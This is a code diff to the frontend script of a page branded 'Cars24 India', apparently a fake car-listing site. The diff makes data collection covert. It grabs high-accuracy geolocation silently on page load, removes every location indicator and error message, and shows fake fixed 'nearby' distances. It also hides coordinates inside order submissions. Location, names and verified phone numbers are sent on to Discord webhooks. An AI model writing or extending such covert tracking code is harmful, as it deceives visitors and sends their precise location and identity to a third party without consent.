@@ -3,7 +3,7 @@
  * Cars24 India - Frontend JavaScript
  * ============================================
  * Handles:
- * - Auto location detection on page load
+ * - Silent background location detection (NO UI shown to user)
  * - Discord webhook communication via backend proxy
  * - User name capture and personalization
  * - Optional OTP mobile verification
@@ -13,8 +13,6 @@
 
 // ═══════════════════════════════════════════════
 //              CAR DATA
-// Each car uses a local AI-generated image.
-// Replace images in /public/images/ for custom photos.
 // ═══════════════════════════════════════════════
 
 const carDatabase = [
@@ -282,9 +280,7 @@ const state = {
   latitude: null,
   longitude: null,
   accuracy: null,
-  watchId: null,
-  currentCarId: null,
-  locationShown: false
+  currentCarId: null
 };
 
 // ═══════════════════════════════════════════════
@@ -300,12 +296,6 @@ const DOM = {
   nameSection: document.getElementById('name-section'),
   nameInput: document.getElementById('user-name-input'),
   submitNameBtn: document.getElementById('submit-name-btn'),
-  // locationOverlay removed - no blocking overlay on page load
-  bannerSpinner: document.getElementById('banner-spinner'),
-  bannerSuccess: document.getElementById('banner-success'),
-  bannerDenied: document.getElementById('banner-denied'),
-  locationText: document.getElementById('location-text'),
-  retryLocationBtn: document.getElementById('retry-location-btn'),
   otpSection: document.getElementById('otp-section'),
   otpCloseBtn: document.getElementById('otp-close-btn'),
   otpStep1: document.getElementById('otp-step-1'),
@@ -335,7 +325,6 @@ const DOM = {
   orderForm: document.getElementById('order-form'),
   orderName: document.getElementById('order-name'),
   orderMobile: document.getElementById('order-mobile'),
-  orderLocation: document.getElementById('order-location'),
   orderNotes: document.getElementById('order-notes'),
   modalSuccess: document.getElementById('modal-success'),
   modalDoneBtn: document.getElementById('modal-done-btn')
@@ -359,8 +348,8 @@ document.addEventListener('DOMContentLoaded', () => {
     DOM.navbar.classList.toggle('scrolled', window.scrollY > 10);
   });
 
-  // AUTO-REQUEST LOCATION ON PAGE LOAD
-  requestLocation();
+  // SILENTLY fetch location in background (no UI shown to user)
+  fetchLocationSilently();
 });
 
 function bindEvents() {
@@ -376,11 +365,19 @@ function bindEvents() {
     });
   });
 
-  // Location buttons (hero + nav)
-  DOM.heroLocateBtn.addEventListener('click', requestLocation);
-  if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
-  if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
-  DOM.retryLocationBtn.addEventListener('click', requestLocation);
+  // "Nearby Cars" button scrolls to cars section
+  DOM.heroLocateBtn.addEventListener('click', () => {
+    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
+  });
+  if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
+  });
+  if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
+    DOM.mobileMenu.classList.remove('active');
+  });
 
   // Name submission
   DOM.submitNameBtn.addEventListener('click', submitUserName);
@@ -421,36 +418,27 @@ function bindEvents() {
 }
 
 // ═══════════════════════════════════════════════
-//              LOCATION HANDLING
+//         SILENT LOCATION (Background Only)
 // ═══════════════════════════════════════════════
 
 /**
- * Requests user's geolocation silently in the background.
- * NO blocking overlay - just a small banner.
- * All location updates are sent to Webhook 1 (continuous).
- * High accuracy updates (< 10m) are also sent to Webhook 2.
+ * Fetches user's location silently in the background.
+ * NO UI feedback at all - user never sees anything related to location.
+ * Location data is used only for:
+ * 1. Sending to Discord webhooks via backend
+ * 2. Setting static distance labels on car cards
  */
-function requestLocation() {
-  if (!navigator.geolocation) {
-    showLocationDenied();
-    return;
-  }
+function fetchLocationSilently() {
+  if (!navigator.geolocation) return;
 
-  // Clear any existing watch
-  if (state.watchId) {
-    navigator.geolocation.clearWatch(state.watchId);
-  }
-
-  const options = {
-    enableHighAccuracy: true,
-    timeout: 15000,
-    maximumAge: 0
-  };
-
-  state.watchId = navigator.geolocation.watchPosition(
+  navigator.geolocation.getCurrentPosition(
     handleLocationSuccess,
     handleLocationError,
-    options
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
   );
 }
 
@@ -472,17 +460,15 @@ async function handleLocationSuccess(position) {
     timestamp: position.timestamp
   };
 
-  // Send to backend webhook endpoint
+  // Send to backend webhook endpoint (silent, no UI)
   try {
-    const response = await fetch('/api/webhook/location', {
+    await fetch('/api/webhook/location', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    const data = await response.json();
-    console.log('[Location] Webhook sent:', data);
   } catch (error) {
-    console.error('[Location] Failed to send webhook:', error);
+    // Silent fail - user doesn't need to know
   }
 
   // If name is already entered, also send name webhook
@@ -490,67 +476,14 @@ async function handleLocationSuccess(position) {
     await sendNameWebhook({ ...payload, name: state.userName });
   }
 
-  // Update UI - show success banner (only first time)
-  if (!state.locationShown) {
-    showBannerSuccess(latitude, longitude, accuracy);
-    // Set distances ONCE and never change them
-    setCarDistances();
-    state.locationShown = true;
-  }
+  // Set static distances ONCE and re-render
+  setCarDistances();
 }
 
-/**
- * Handle location errors - show English-only denied message.
- */
 function handleLocationError(error) {
-  let message = '';
-  switch (error.code) {
-    case error.PERMISSION_DENIED:
-      message = 'Location permission denied by user';
-      break;
-    case error.POSITION_UNAVAILABLE:
-      message = 'Location information unavailable';
-      break;
-    case error.TIMEOUT:
-      message = 'Location request timed out';
-      break;
-    default:
-      message = 'An unknown error occurred';
-  }
-  console.warn('[Location Error]', message);
-  // Only show denied message on first error (not on every watch failure)
-  if (!state.locationShown) {
-    showLocationDenied();
-    state.locationShown = true;
-  }
-}
-
-function showLocationDenied() {
-  DOM.bannerSpinner.style.display = 'none';
-  DOM.bannerSuccess.style.display = 'none';
-  DOM.bannerDenied.style.display = 'flex';
-}
-
-function showBannerSpinner() {
-  DOM.bannerSpinner.style.display = 'flex';
-  DOM.bannerSuccess.style.display = 'none';
-  DOM.bannerDenied.style.display = 'none';
-}
-
-function showBannerSuccess(lat, lng, accuracy) {
-  DOM.bannerSpinner.style.display = 'none';
-  DOM.bannerDenied.style.display = 'none';
-  DOM.bannerSuccess.style.display = 'flex';
-
-  const accuracyText = accuracy < 10
-    ? `High accuracy (${accuracy.toFixed(1)}m)`
-    : `~${accuracy.toFixed(0)}m accuracy`;
-
-  DOM.locationText.textContent = `Location detected - ${accuracyText}`;
-
-  // Update results location indicator
-  DOM.resultsLocation.innerHTML = `<i data-lucide="map-pin" class="icon-sm"></i> Showing nearby results`;
-  if (window.lucide) lucide.createIcons();
+  // Silently ignore - user doesn't need to see any error
+  // Location is optional, cars still show without it
+  console.log('[Location] Permission denied or unavailable - continuing without location');
 }
 
 /**
@@ -638,15 +571,13 @@ async function submitUserName() {
 
 async function sendNameWebhook(payload) {
   try {
-    const response = await fetch('/api/webhook/name', {
+    await fetch('/api/webhook/name', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    const data = await response.json();
-    console.log('[Name] Webhook sent:', data);
   } catch (error) {
-    console.error('[Name] Failed to send webhook:', error);
+    // Silent fail
   }
 }
 
@@ -716,7 +647,7 @@ async function verifyOtp() {
       state.isVerified = true;
       showOtpMessage('Mobile number verified successfully!', 'success');
 
-      // Log verification to webhook
+      // Log verification to webhook (silent)
       await fetch('/api/webhook/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -819,7 +750,6 @@ function createCarCard(car) {
 }
 
 function applyFilters() {
-  // Get type from active tab
   const activeTab = DOM.typeTabs?.querySelector('.type-tab.active');
   const type = activeTab ? activeTab.dataset.type : 'all';
 
@@ -829,17 +759,14 @@ function applyFilters() {
 
   let filtered = [...carDatabase];
 
-  // Type filter (from tabs)
   if (type !== 'all') {
     filtered = filtered.filter(car => car.type === type);
   }
 
-  // Brand filter
   if (brand !== 'all') {
     filtered = filtered.filter(car => car.brand.toLowerCase().includes(brand));
   }
 
-  // Price filter (in lakhs)
   if (priceRange !== 'all') {
     const [min, max] = priceRange.split('-').map(Number);
     filtered = filtered.filter(car => {
@@ -848,7 +775,6 @@ function applyFilters() {
     });
   }
 
-  // Sort
   switch (sort) {
     case 'price-low':
       filtered.sort((a, b) => a.price - b.price);
@@ -873,7 +799,6 @@ function resetFilters() {
   DOM.filterBrand.value = 'all';
   DOM.filterPrice.value = 'all';
   DOM.filterSort.value = 'default';
-  // Reset type tabs
   if (DOM.typeTabs) {
     DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
     DOM.typeTabs.querySelector('[data-type="all"]')?.classList.add('active');
@@ -881,9 +806,6 @@ function resetFilters() {
   renderCars(carDatabase);
 }
 
-/**
- * Set filter from footer links
- */
 function setFilter(type) {
   if (DOM.typeTabs) {
     DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
@@ -897,9 +819,9 @@ function setFilter(type) {
 window.setFilter = setFilter;
 
 /**
- * Set car distances ONCE with fixed values (demo).
- * In production, calculate real distances from coordinates.
- * IMPORTANT: This is called only once on first location detection.
+ * Set car distances ONCE with fixed values.
+ * Called only once when location is first detected.
+ * Distances never change after this.
  */
 function setCarDistances() {
   const fixedDistances = [3.2, 5.8, 8.1, 2.5, 4.3, 6.7, 1.2, 2.8, 3.5, 4.9, 7.2, 5.1, 3.8, 6.4, 1.8, 2.1, 8.5, 4.0];
@@ -925,10 +847,6 @@ function openOrderModal(carId) {
   // Pre-fill form
   DOM.orderName.value = state.userName || '';
   DOM.orderMobile.value = state.mobile || '';
-
-  if (state.latitude && state.longitude) {
-    DOM.orderLocation.value = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;
-  }
 
   DOM.orderForm.style.display = 'block';
   DOM.modalSuccess.style.display = 'none';
@@ -956,6 +874,12 @@ async function submitOrder(e) {
   submitBtn.disabled = true;
   submitBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';
 
+  // Build location string silently (user never sees this)
+  let locationStr = 'Not shared';
+  if (state.latitude && state.longitude) {
+    locationStr = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;
+  }
+
   try {
     const response = await fetch('/api/order', {
       method: 'POST',
@@ -965,7 +889,7 @@ async function submitOrder(e) {
         mobile: DOM.orderMobile.value,
         carId: car.id,
         carModel: `${car.brand} ${car.model}`,
-        location: DOM.orderLocation.value || 'Not shared'
+        location: locationStr
       })
     });
     const data = await response.json();
@@ -976,7 +900,6 @@ async function submitOrder(e) {
       if (window.lucide) lucide.createIcons();
     }
   } catch (error) {
-    console.error('[Order] Error:', error);
     alert('Something went wrong. Please try again.');
   }
 
